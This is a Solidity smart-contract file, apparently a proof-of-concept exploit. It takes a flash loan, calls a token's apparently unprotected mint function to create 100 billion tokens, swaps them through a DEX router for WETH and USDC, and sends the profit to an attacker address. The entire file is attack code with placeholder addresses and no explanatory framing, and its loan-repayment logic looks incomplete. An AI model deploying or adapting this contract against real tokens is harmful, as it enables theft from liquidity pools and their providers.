// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IHZC {
    function mint(address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ILendingPool {
    function flashLoan(address receiver, address[] calldata assets, uint256[] calldata amounts,
        uint256[] calldata modes, address onBehalfOf, bytes calldata params, uint16 referralCode) external;
}

interface IUniswapRouter {
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path,
        address to, uint deadline) external returns (uint[] memory amounts);
}

contract ExploitRouter {
    address constant HZC = 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;
    address constant ROUTER = 0xBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB;
    address constant WETH = 0xCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC;
    address constant USDC = 0xDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD;
    address constant POOL = 0xEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE;

    uint256 constant MINT_100B = 100000000000000000000000000000;
    address payable public ATTACKER;

    constructor(address payable _attacker) { ATTACKER = _attacker; }

    function startExploit(address loanToken, uint256 amount) external {
        address[] memory assets = new address[](1); assets[0] = loanToken;
        uint256[] memory amounts = new uint256[](1); amounts[0] = amount;
        uint256[] memory modes = new uint256[](1); modes[0] = 0;

        ILendingPool(POOL).flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(address[] calldata assets, uint256[] calldata amounts,
        uint256[] calldata premiums, address, bytes calldata) external returns (bool) {

        IHZC(HZC).mint(address(this), MINT_100B);
        IHZC(HZC).approve(ROUTER, type(uint256).max);

        address[] memory path = new address[](3);
        path[0] = HZC; path[1] = WETH; path[2] = USDC;

        IUniswapRouter(ROUTER).swapExactTokensForTokens(
            MINT_100B, 1, path, address(this), block.timestamp + 1200
        );

        IERC20(assets[0]).transfer(ATTACKER,
            IERC20(assets[0]).balanceOf(address(this)) - (amounts[0] + premiums[0])
        );

        return true;
    }
}
